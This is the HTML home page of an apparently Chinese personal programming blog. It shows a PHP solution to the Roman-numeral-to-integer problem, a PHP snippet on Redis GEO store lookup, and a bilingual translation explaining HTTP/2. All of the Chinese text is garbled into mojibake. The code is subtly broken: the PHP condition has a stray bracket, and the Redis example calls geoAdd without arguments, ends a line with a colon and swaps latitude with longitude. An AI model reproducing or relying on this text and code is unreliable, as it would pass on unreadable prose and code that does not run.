<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta name="description" content="ä¸€èµ·å­¦ä¹ ï¼Œä¸€èµ·è¿›æ­¥">
<meta name="keywords" content="php,blog,å­¦ä¹ ">
<meta property="og:type" content="website">
<meta property="og:title" content="ç®€æ°çš„ Blog">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="ç®€æ°çš„ Blog">
<meta property="og:description" content="ä¸€èµ·å­¦ä¹ ï¼Œä¸€èµ·è¿›æ­¥">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="ç®€æ°çš„ Blog">
<meta name="twitter:description" content="ä¸€èµ·å­¦ä¹ ï¼Œä¸€èµ·è¿›æ­¥">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'åšä¸»'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/">





  <title>ç®€æ°çš„ Blog</title>
  





  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?3094125d6c6fead2ab23a1ef8b067249";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>




</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">ç®€æ°çš„ Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">ä¸€èµ·å­¦ä¹ ï¼Œä¸€èµ·è¿›æ­¥</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            é¦–é¡µ
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            åˆ†ç±»
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            æ ‡ç­¾
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            å½’æ¡£
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            å…³äº
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
            
            æœç´¢
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="æœç´¢..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/ç®—æ³•/roman-to-integer/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="jani">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/img/12641322.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ç®€æ°çš„ Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/ç®—æ³•/roman-to-integer/" itemprop="url">ç½—é©¬æ•°å­—è½¬æ•´æ•°</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2019-04-21T22:40:45+08:00">
                2019-04-21
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">åˆ†ç±»äº</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/ç®—æ³•/" itemprop="url" rel="index">
                    <span itemprop="name">ç®—æ³•</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/ç®—æ³•/roman-to-integer/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/ç®—æ³•/roman-to-integer/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p>ç½—é©¬æ•°å­—åŒ…å«ä»¥ä¸‹ä¸ƒç§å­—ç¬¦: <code>I</code>ï¼Œ <code>V</code>ï¼Œ<code>X</code>ï¼Œ <code>L</code>ï¼Œ<code>C</code>ï¼Œ<code>D</code> å’Œ <code>M</code>ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">å­—ç¬¦          æ•°å€¼</span><br><span class="line">I             1</span><br><span class="line">V             5</span><br><span class="line">X             10</span><br><span class="line">L             50</span><br><span class="line">C             100</span><br><span class="line">D             500</span><br><span class="line">M             1000</span><br></pre></td></tr></table></figure>
<p>ä¾‹å¦‚ï¼Œ ç½—é©¬æ•°å­— 2 å†™åš <code>II</code> ï¼Œå³ä¸ºä¸¤ä¸ªå¹¶åˆ—çš„ 1ã€‚12 å†™åš <code>XII</code> ï¼Œå³ä¸º <code>X</code> + <code>II</code> ã€‚ 27 å†™åš  <code>XXVII</code>, å³ä¸º <code>XX</code> + <code>V</code> + <code>II</code> ã€‚</p>
<p>é€šå¸¸æƒ…å†µä¸‹ï¼Œç½—é©¬æ•°å­—ä¸­å°çš„æ•°å­—åœ¨å¤§çš„æ•°å­—çš„å³è¾¹ã€‚ä½†ä¹Ÿå­˜åœ¨ç‰¹ä¾‹ï¼Œä¾‹å¦‚ 4 ä¸å†™åš <code>IIII</code>ï¼Œè€Œæ˜¯ <code>IV</code>ã€‚æ•°å­— 1 åœ¨æ•°å­— 5 çš„å·¦è¾¹ï¼Œæ‰€è¡¨ç¤ºçš„æ•°ç­‰äºå¤§æ•° 5 å‡å°æ•° 1 å¾—åˆ°çš„æ•°å€¼ 4 ã€‚åŒæ ·åœ°ï¼Œæ•°å­— 9 è¡¨ç¤ºä¸º <code>IX</code>ã€‚è¿™ä¸ªç‰¹æ®Šçš„è§„åˆ™åªé€‚ç”¨äºä»¥ä¸‹å…­ç§æƒ…å†µï¼š</p>
<ul>
<li><code>I</code> å¯ä»¥æ”¾åœ¨ <code>V</code> (5) å’Œ <code>X</code> (10) çš„å·¦è¾¹ï¼Œæ¥è¡¨ç¤º 4 å’Œ 9ã€‚</li>
<li><code>X</code> å¯ä»¥æ”¾åœ¨ <code>L</code> (50) å’Œ <code>C</code> (100) çš„å·¦è¾¹ï¼Œæ¥è¡¨ç¤º 40 å’Œ 90ã€‚</li>
<li><code>C</code> å¯ä»¥æ”¾åœ¨ <code>D</code> (500) å’Œ <code>M</code> (1000) çš„å·¦è¾¹ï¼Œæ¥è¡¨ç¤º 400 å’Œ 900ã€‚</li>
</ul>
<p>ç»™å®šä¸€ä¸ªç½—é©¬æ•°å­—ï¼Œå°†å…¶è½¬æ¢æˆæ•´æ•°ã€‚è¾“å…¥ç¡®ä¿åœ¨ 1 åˆ° 3999 çš„èŒƒå›´å†…ã€‚</p>
<p>ç¤ºä¾‹ 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥: &quot;III&quot;</span><br><span class="line">è¾“å‡º: 3</span><br></pre></td></tr></table></figure>
<p>ç¤ºä¾‹ 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥: &quot;IV&quot;</span><br><span class="line">è¾“å‡º: 4</span><br></pre></td></tr></table></figure>
<p>ç¤ºä¾‹ 3:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥: &quot;IX&quot;</span><br><span class="line">è¾“å‡º: 9</span><br></pre></td></tr></table></figure>
<p>ç¤ºä¾‹ 4:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥: &quot;LVIII&quot;</span><br><span class="line">è¾“å‡º: 58</span><br><span class="line">è§£é‡Š: L = 50, V= 5, III = 3.</span><br></pre></td></tr></table></figure>
<p>ç¤ºä¾‹ 5:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥: &quot;MCMXCIV&quot;</span><br><span class="line">è¾“å‡º: 1994</span><br><span class="line">è§£é‡Š: M = 1000, CM = 900, XC = 90, IV = 4.</span><br></pre></td></tr></table></figure>
<p><a href="https://leetcode-cn.com/problems/roman-to-integer/" target="_blank" rel="noopener">é¢˜ç›®é“¾æ¥</a></p>
<h3 id="æç¤º"><a href="#æç¤º" class="headerlink" title="æç¤º"></a>æç¤º</h3><ul>
<li>å¦‚æœ I åœ¨ V æˆ– X ä¹‹å‰, å‡å» 1 å¦‚: IV = 4 and IX = 9</li>
<li>å¦‚æœ X åœ¨ L æˆ– C ä¹‹å‰, å‡å» 10 å¦‚: XL = 40 and XC = 90</li>
<li>å¦‚æœ C åœ¨ D æˆ– M ä¹‹å‰, å‡å» 100 å¦‚: CD = 400 and CM = 900</li>
</ul>
<h2 id="æ ‡ç­¾"><a href="#æ ‡ç­¾" class="headerlink" title="æ ‡ç­¾"></a>æ ‡ç­¾</h2><ul>
<li>æ•°å­¦</li>
<li>å­—ç¬¦ä¸²</li>
</ul>
<h2 id="ä¸ªäººè§£ç­”"><a href="#ä¸ªäººè§£ç­”" class="headerlink" title="ä¸ªäººè§£ç­”"></a>ä¸ªäººè§£ç­”</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">romanToInt</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    $map = [</span><br><span class="line">        <span class="string">'I'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">        <span class="string">'V'</span> =&gt; <span class="number">5</span>,</span><br><span class="line">        <span class="string">'X'</span> =&gt; <span class="number">10</span>,</span><br><span class="line">        <span class="string">'L'</span> =&gt; <span class="number">50</span>,</span><br><span class="line">        <span class="string">'C'</span> =&gt; <span class="number">100</span>,</span><br><span class="line">        <span class="string">'D'</span> =&gt; <span class="number">500</span>,</span><br><span class="line">        <span class="string">'M'</span> =&gt; <span class="number">1000</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    $num = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    $len = strlen($s);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($i &lt; $len - <span class="number">1</span>) &amp;&amp; ($map[$s&#123;$i&#125;] &lt; $map[$s&#123;$i+<span class="number">1</span>&#125;]])) &#123;</span><br><span class="line">            $num -= $map[$s&#123;$i&#125;];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $num += $map[$s&#123;$i&#125;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/åŠŸèƒ½/redis-geo/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="jani">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/img/12641322.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ç®€æ°çš„ Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/åŠŸèƒ½/redis-geo/" itemprop="url">Redis GEO é™„è¿‘çš„è¿é”åº—</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2019-04-21T16:16:28+08:00">
                2019-04-21
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">åˆ†ç±»äº</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/åŠŸèƒ½/" itemprop="url" rel="index">
                    <span itemprop="name">åŠŸèƒ½</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/åŠŸèƒ½/redis-geo/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/åŠŸèƒ½/redis-geo/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="è¯´æ˜"><a href="#è¯´æ˜" class="headerlink" title="è¯´æ˜"></a>è¯´æ˜</h2><p>reids é‡Œè‡ªå¸¦çš„ä¸€ä¸ªåæ ‡å®šä½æ–¹æ³•ã€‚</p>
<h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$redis = <span class="keyword">new</span> Redis();</span><br><span class="line">$redis-&gt;connect(<span class="string">"127.0.0.1"</span>, <span class="number">6379</span>);</span><br><span class="line">$redis-&gt;auth(<span class="string">'you_password'</span>);</span><br><span class="line">$redis-&gt;select(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ·»åŠ åæ ‡</span></span><br><span class="line">$key = <span class="string">'7-Eleven'</span>;</span><br><span class="line"><span class="keyword">list</span>($x, $y) = [<span class="number">23.1194200000</span>,<span class="number">113.4155300000</span>];</span><br><span class="line">$region = <span class="string">"å¹¿å·è½¦å¡åˆ†åº—"</span>;</span><br><span class="line">$redis-&gt;geoAdd($key, $x, $y, $region);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ›´æ–°åæ ‡</span></span><br><span class="line"><span class="keyword">list</span>($x, $y) = [<span class="number">25.1194200000</span>,<span class="number">114.4155300000</span>];</span><br><span class="line">$redis-&gt;geoAdd();</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ é™¤åæ ‡</span></span><br><span class="line">$redis-&gt;del($key);</span><br><span class="line"></span><br><span class="line">$redis-&gt;zRem($key, $region);</span><br><span class="line"></span><br><span class="line"><span class="comment">// åº—é“ºç»çº¬åº¦</span></span><br><span class="line">$redis-&gt;geoPos($key, $region);</span><br><span class="line"></span><br><span class="line"><span class="comment">// åº—é“ºä¸åº—é“ºä¹‹é—´çš„è·ç¦»</span></span><br><span class="line">$redis-&gt;geoDist($key, $region, $region, <span class="string">'km'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// é™„è¿‘çš„åº—</span></span><br><span class="line">$options = [</span><br><span class="line">    <span class="string">'ASC'</span></span><br><span class="line">];</span><br><span class="line">$redis-&gt;geoRadius($key, <span class="number">-157.858</span>, <span class="number">21.306</span>, <span class="number">1</span>, <span class="string">'km'</span>, $options):</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/ç¿»è¯‘/what-is-http-2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="jani">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/img/12641322.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ç®€æ°çš„ Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/ç¿»è¯‘/what-is-http-2/" itemprop="url">What is HTTP/2?(ä»€ä¹ˆæ˜¯ HTTP/2ï¼Ÿ)</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2019-04-21T15:12:24+08:00">
                2019-04-21
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">åˆ†ç±»äº</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/ç¿»è¯‘/" itemprop="url" rel="index">
                    <span itemprop="name">ç¿»è¯‘</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/ç¿»è¯‘/what-is-http-2/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/ç¿»è¯‘/what-is-http-2/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>Before diving straight into the topic, letâ€™s first look at some of the HTTP/2 terminologies used frequently.</p>
<p>åœ¨æ·±å…¥è®¨è®ºä¹‹å‰ï¼Œè®©æˆ‘ä»¬å…ˆçœ‹ä¸‹ç»å¸¸ä½¿ç”¨çš„ä¸€äº› HTTP/2 çš„æœ¯è¯­ã€‚</p>
<ul>
<li>Stream: An established bidirectional connection which may carry one or more messages</li>
<li>Message: A complete sequence of frames that represents a request or response message</li>
<li>Frame: The smallest unit of communication in HTTP/2. Each frame contains a frame header which could identify the stream to which the frame belongs.</li>
<li><p>h2: Short term for HTTP/2</p>
</li>
<li><p>æµ: å·²å»ºç«‹çš„åŒå‘è¿æ¥ï¼Œå¯ä»¥æºå¸¦ä¸€ä¸ªæˆ–å¤šä¸ªæ¶ˆæ¯</p>
</li>
<li>æ¶ˆæ¯: è¡¨ç¤ºè¯·æ±‚æˆ–å“åº”æ¶ˆæ¯çš„å®Œæ•´å¸§åºåˆ—</li>
<li>å¸§: HTTP/2 ä¸­æœ€å°çš„é€šä¿¡å•ä½ã€‚ æ¯ä¸ªå¸§åŒ…å«ä¸€ä¸ªå¸§å¤´ï¼Œå®ƒå¯ä»¥è¯†åˆ«å¸§æ‰€å±çš„æµã€‚</li>
<li>h2: HTTP/2 çš„çŸ­æœŸ</li>
</ul>
<p><strong>Note:</strong> It was originally named as HTTP/2.0 but later â€œ.0â€ part was dropped because it has caused some confusions with HTTP/1.x. So we no longer use HTTP/2.0, itâ€™s HTTP/2 or h2 for short ğŸ˜Š</p>
<p><strong>æ³¨æ„:</strong> å®ƒæœ€åˆè¢«å‘½åä¸º HTTP/2.0ï¼Œä½†åæ¥â€œ.0â€éƒ¨åˆ†è¢«åˆ é™¤ï¼Œå› ä¸ºå®ƒå¼•èµ·äº† HTTP/1.x çš„ä¸€äº›æ··æ·†ã€‚ æ‰€ä»¥æˆ‘ä»¬ä¸å†ä½¿ç”¨ HTTP/2.0ï¼Œç®€è€Œè¨€ä¹‹æ˜¯ HTTP/2 æˆ– h2</p>
<h2 id="Overview-of-HTTP-2"><a href="#Overview-of-HTTP-2" class="headerlink" title="Overview of HTTP/2"></a>Overview of HTTP/2</h2><h2 id="HTTP-2-çš„æ¦‚å¿µ"><a href="#HTTP-2-çš„æ¦‚å¿µ" class="headerlink" title="HTTP/2 çš„æ¦‚å¿µ"></a>HTTP/2 çš„æ¦‚å¿µ</h2><p>HTTP/2 is a major revision of the HTTP network protocol which is still being widely used over the World Wide Web. It was developed to overcome some of the drawbacks found in HTTP/1.0 and HTTP/1.1 versions. Overhead of repetitive headers and <strong>Head-of-line blocking</strong> (HOL blockingâ€Šâ€”â€Šwhen one request is blocking others from completing) are two such major problems addressed.</p>
<p>HTTP/2 æ˜¯ HTTP ç½‘ç»œåè®®çš„ä¸»è¦ä¿®è®¢ç‰ˆï¼Œå®ƒä»åœ¨ä¸‡ç»´ç½‘ä¸Šå¹¿æ³›ä½¿ç”¨ã€‚ å®ƒçš„å¼€å‘æ˜¯ä¸ºäº†å…‹æœ HTTP/1.0 å’Œ HTTP/1.1 ç‰ˆæœ¬ä¸­çš„ä¸€äº›ç¼ºç‚¹ã€‚ é‡å¤æ ‡é¢˜å’Œ <strong>è¡Œå¤´é˜»å¡</strong> çš„å¼€é”€ï¼ˆHOL é˜»æ­¢ - å½“ä¸€ä¸ªè¯·æ±‚é˜»æ­¢å…¶ä»–äººå®Œæˆæ—¶ï¼‰æ˜¯ä¸¤ä¸ªè¿™æ ·çš„ä¸»è¦é—®é¢˜ã€‚</p>
<p>HTTP/2 enables more efficient use of network resources, header fields compression, multiple concurrent exchanges on the same connection reducing the latency to a great extent.</p>
<p>HTTP/2 å¯ä»¥æ›´æœ‰æ•ˆåœ°ä½¿ç”¨ç½‘ç»œèµ„æºï¼Œå¤´å­—æ®µå‹ç¼©ï¼ŒåŒä¸€è¿æ¥ä¸Šçš„å¤šä¸ªå¹¶å‘äº¤æ¢ï¼Œåœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šå‡å°‘äº†å»¶è¿Ÿã€‚</p>
<p>HTTP/2 also introduces <strong>Server Push</strong> that allows a server to send desired data to a client that the server anticipates the client will need in the future. Thus, HTTP/2 provides enhanced security, speed, and usability.</p>
<p>HTTP/2 è¿˜å¼•å…¥äº† <strong>æœåŠ¡å™¨æ¨é€</strong>ï¼Œå…è®¸æœåŠ¡å™¨å°†æ‰€éœ€æ•°æ®å‘é€åˆ°æœåŠ¡å™¨é¢„æœŸå®¢æˆ·ç«¯å°†æ¥éœ€è¦çš„å®¢æˆ·ç«¯ã€‚ å› æ­¤ï¼ŒHTTP/2 æä¾›å¢å¼ºçš„å®‰å…¨æ€§ï¼Œé€Ÿåº¦å’Œå¯ç”¨æ€§ã€‚</p>
<p>HTTP/2 uses the same URI scheme and shares the same default HTTP ports as of HTTP/1.1.</p>
<p>HTTP/2 ä½¿ç”¨ç›¸åŒçš„ URI æ–¹æ¡ˆï¼Œå¹¶å…±äº«ä¸ HTTP/1.1 ç›¸åŒçš„é»˜è®¤ HTTP ç«¯å£ã€‚</p>
<p>All communication is performed over a single TCP connection that can carry any number of <strong>bidirectional</strong> streams. Each stream has a unique identifier and optional priority information that is used to carry bidirectional messages. The frame is the unit of communication and there are several types of frames such as HEADER, DATA, and SETTINGS. For request and response communication, HEADER and DATA frames are primarily being used.</p>
<p>æ‰€æœ‰é€šä¿¡éƒ½é€šè¿‡å•ä¸ª TCP è¿æ¥æ‰§è¡Œï¼Œè¯¥è¿æ¥å¯ä»¥æ‰¿è½½ä»»æ„æ•°é‡çš„ <strong>åŒå‘æµ</strong>ã€‚æ¯ä¸ªæµéƒ½æœ‰å”¯ä¸€çš„æ ‡è¯†ç¬¦å’Œå¯é€‰çš„ä¼˜å…ˆçº§ä¿¡æ¯ï¼Œç”¨äºæºå¸¦åŒå‘æ¶ˆæ¯ã€‚å¸§æ˜¯é€šä¿¡å•å…ƒï¼Œæœ‰å‡ ç§ç±»å‹çš„å¸§ï¼Œå¦‚ HEADERã€DATA å’Œ SETTINGSã€‚ å¯¹äºè¯·æ±‚å’Œå“åº”é€šä¿¡ï¼Œä¸»è¦ä½¿ç”¨ HEADER å’Œ DATA å¸§ã€‚</p>
